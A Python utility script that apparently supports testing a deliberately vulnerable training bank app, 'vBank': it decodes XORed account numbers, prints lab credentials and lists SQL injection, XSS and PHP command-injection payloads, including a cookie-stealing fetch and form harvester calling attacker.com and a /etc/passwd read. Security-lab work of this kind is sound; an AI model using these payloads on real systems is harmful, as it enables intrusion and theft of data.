#!/usr/bin/env python3
"""
vBank Utility Script
Provides helper functions for testing vBank vulnerabilities
"""

import sys
import argparse

class VBankUtils:
    XOR_KEY = 0x0BADC0DE
    
    @staticmethod
    def xor_account(account):
        """Convert between original and XORed account numbers"""
        return account ^ VBankUtils.XOR_KEY
    
    @staticmethod
    def decode_xored(xored_account):
        """Decode XORed account number to original"""
        return xored_account ^ VBankUtils.XOR_KEY
    
    @staticmethod
    def encode_account(original_account):
        """Encode account number to XORed form"""
        return original_account ^ VBankUtils.XOR_KEY
    
    @staticmethod
    def sql_injection_payloads():
        """Return common SQL injection payloads"""
        return {
            'auth_bypass': "' OR '1'='1",
            'comment_out': "' --",
            'union_select': "' UNION SELECT 1,2,3,4,5,6,7,8--",
            'time_based': "' AND SLEEP(5)--",
            'extract_passwords': "' UNION SELECT password,username,1,2,3,4,5,6 FROM users--",
            'extract_all': "' UNION SELECT * FROM users--",
        }
    
    @staticmethod
    def xss_payloads():
        """Return common XSS payloads for testing"""
        return {
            'alert': '<img src=x onerror="alert(\'XSS\')">',
            'console': '<img src=x onerror="console.log(document.cookie)">',
            'cookie_steal': '<img src=x onerror="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">',
            'js_redirect': '<script>window.location="http://attacker.com"</script>',
            'form_hijack': '<form action="http://attacker.com/harvest" method="POST"><input name="user" value="test"></form>',
            'event_handler': '<body onload="alert(\'XSS\')">',
            'img_onerror': '<img src=x onerror="alert(\'XSS\')">',
            'svg_script': '<svg onload="alert(\'XSS\')">',
        }

    @staticmethod
    def rce_payloads():
        """Return common RCE payloads for preg_replace /e"""
        return {
            'id': 'test"; system(\'id\'); echo "',
            'whoami': 'test"; system(\'whoami\'); echo "',
            'phpinfo': 'test"; phpinfo(); echo "',
            'read_passwd': 'test"; echo file_get_contents(\'/etc/passwd\'); echo "',
        }

def main():
    parser = argparse.ArgumentParser(description='vBank Utility - Account number conversion and payload generation')
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # XOR conversion commands
    decode_parser = subparsers.add_parser('decode', help='Decode XORed account number')
    decode_parser.add_argument('account', type=int, help='XORed account number')
    
    encode_parser = subparsers.add_parser('encode', help='Encode account number to XORed form')
    encode_parser.add_argument('account', type=int, help='Original account number')
    
    # Known accounts
    subparsers.add_parser('accounts', help='Show known account numbers and their XORed values')
    
    # Payloads
    subparsers.add_parser('sql', help='Show SQL injection payloads')
    subparsers.add_parser('xss', help='Show XSS payloads')
    subparsers.add_parser('rce', help='Show RCE payloads')
    
    # Info
    subparsers.add_parser('info', help='Show vBank configuration information')
    
    args = parser.parse_args()
    
    if args.command == 'decode':
        original = VBankUtils.decode_xored(args.account)
        print(f"Xored: {args.account}")
        print(f"Original: {original}")
        print(f"Hex: 0x{original:X}")
    
    elif args.command == 'encode':
        xored = VBankUtils.encode_account(args.account)
        print(f"Original: {args.account}")
        print(f"Xored: {xored}")
        print(f"Hex: 0x{xored:X}")
    
    elif args.command == 'accounts':
        print("Known Accounts in vBank:")
        print("=" * 60)
        accounts = [
            (11111111, 'alex', 1000),
            (22222222, 'bob', 222),
            (33333333, 'alex', 344),
        ]
        for account, owner, balance in accounts:
            xored = VBankUtils.encode_account(account)
            print(f"Account: {account:10d} | Xored: {xored:10d} | Owner: {owner:5s} | Balance: ${balance}")
        print("=" * 60)
        print(f"XOR Key: 0x{VBankUtils.XOR_KEY:X} ({VBankUtils.XOR_KEY})")
    
    elif args.command == 'sql':
        print("Common SQL Injection Payloads:")
        print("=" * 60)
        payloads = VBankUtils.sql_injection_payloads()
        for name, payload in payloads.items():
            print(f"\n[{name}]")
            print(f"  {payload}")
    
    elif args.command == 'xss':
        print("Common XSS Payloads:")
        print("=" * 60)
        payloads = VBankUtils.xss_payloads()
        for name, payload in payloads.items():
            print(f"\n[{name}]")
            print(f"  {payload}")
    
    elif args.command == 'rce':
        print("Common RCE Payloads (preg_replace /e):")
        print("=" * 60)
        payloads = VBankUtils.rce_payloads()
        for name, payload in payloads.items():
            print(f"\n[{name}]")
            print(f"  {payload}")

    elif args.command == 'info':
        print("vBank Configuration:")
        print("=" * 60)
        print(f"XOR Key: 0x{VBankUtils.XOR_KEY:X} ({VBankUtils.XOR_KEY})")
        print(f"\nDatabase Credentials:")
        print(f"  Server: 127.0.0.1 (or 'mysql' in Docker)")
        print(f"  Port: 3306")
        print(f"  User: root")
        print(f"  Password: aaa")
        print(f"  Database: vbank")
        print(f"\nDefault Users:")
        print(f"  Username: alex  | Password: 413Xp455")
        print(f"  Username: bob   | Password: b0BP4S5")
        print(f"\nVulnerable Components:")
        print(f"  - PHP Version: 5.6 (deprecated functions)")
        print(f"  - MySQL Functions: mysql_* (no prepared statements)")
        print(f"  - Authentication: Plaintext SQL queries")
        print(f"  - Output: No HTML escaping")
        print(f"  - Session: No CSRF tokens")
    
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
